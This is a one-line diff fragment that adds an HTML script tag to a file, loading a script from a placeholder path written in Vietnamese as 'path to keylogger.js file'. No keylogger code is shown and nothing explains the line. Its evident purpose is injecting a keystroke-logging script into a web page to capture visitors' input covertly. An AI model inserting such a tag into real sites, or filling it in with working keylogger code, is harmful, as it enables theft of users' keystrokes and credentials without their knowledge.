@@ -1,0 +1,1 @@
+﻿<script src="đường dẫn tới file keylogger.js">
